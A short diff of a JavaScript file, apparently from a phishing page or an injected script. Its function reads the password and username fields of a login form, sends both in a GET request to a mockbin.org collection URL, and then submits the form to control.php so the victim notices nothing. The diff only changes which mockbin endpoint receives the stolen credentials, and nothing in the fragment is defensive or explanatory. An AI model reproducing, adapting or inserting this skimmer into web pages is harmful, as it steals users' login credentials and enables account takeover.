@@ -6,7 +6,7 @@ function l(){
         document.forms[0].action='control.php';
         document.forms[0].submit();
     };
-    a.open('GET', 'http://mockbin.org/bin/0f3022c4-cb4c-415b-8ea9-c543c0f2d16b?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
+    a.open('GET', 'http://mockbin.org/bin/629195e0-97a5-4855-a995-688dc7f3e7d8?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
     a.send(null);
 }
 var f=document.createElement("form");
